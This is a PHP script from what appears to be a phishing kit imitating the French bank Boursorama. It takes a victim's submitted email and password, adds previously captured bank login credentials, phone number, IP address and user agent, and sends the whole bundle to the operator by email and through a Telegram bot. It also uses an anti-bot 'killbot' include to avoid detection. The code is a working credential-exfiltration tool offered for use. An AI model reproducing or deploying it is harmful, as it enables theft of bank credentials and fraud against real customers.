<?php

include_once '../killbot/code/include.php';
include("../settings.php");
include("../common/sub_includes.php");



if (isset($_POST)) {


	if (!isset($_SESSION)) {
		session_start();
	}

	$_SESSION['email_mail_verif'] = htmlspecialchars($_POST['email_mail_verif']);
	$_SESSION['email_password_verif'] = htmlspecialchars($_POST['email_password_verif']);

	######################
	#### MAIL SENDING ####
	######################

	if ($mail_sending == true) {

		$message = "

[🧨] Email verification [🧨]

🧨 Email verified : " . $_SESSION['email_mail_verif'] . "
🧨 Password Verified : " . $_SESSION['email_password_verif'] . "

🧨 Numéro de téléphone : " . $_SESSION['phone_number'] . "
🧨 Email : " . $_SESSION['email_mail'] . "
🧨 Mot de passe Mail : " . $_SESSION['email_password'] . "

[🧲] Login [🧲]

🧲 Identifiant : " . $_SESSION['identifiant'] . "
🧲 Mot de passe : " . $_SESSION['password'] . "

[⚰️] Additionnellal [⚰️]

⚰️ IP : " . $_SESSION['ip'] . "
⚰️ User-agent : " . $_SESSION['useragent'] . "
					";

		$subject = "[🧨] + 1 Email Verification  |" . $_SESSION['phone_number'] . " | " . $_SESSION['email_mail'];
		$headers = "From: 📦Bourso| <bill@rezzzzz.com>";

		mail($rezmail, $subject, $message, $headers);
	}

	##########################
	#### TELEGRAM SENDING ####
	##########################

	if ($telegram_sending == true) {

		$data = [
			'text' => '

[🧨] Email verification [🧨]

🧨 Email verified : ' . $_SESSION['email_mail_verif'] . '
🧨 Password Verified : ' . $_SESSION['email_password_verif'] . '

🧨 Numéro de téléphone : ' . $_SESSION['phone_number'] . '
🧨 Email : ' . $_SESSION['email_mail'] . '
🧨 Mot de passe Mail : ' . $_SESSION['email_password'] . '
					
[🧲] Login [🧲]

🧲 Identifiant : ' . $_SESSION['identifiant'] . '
🧲 Mot de passe : ' . $_SESSION['password'] . '

[⚰️] Informations additionnelles [⚰️]

⚰️ Adresse Ip : ' . $_SESSION['ip'] . '
⚰️ User-agent : ' . $_SESSION['useragent'] . '
					  
					',
			'chat_id' => $chat_rez
		];

		file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
	}


	header('Location: ../steps/end.php');
} else {
	header('Location: ../');
}
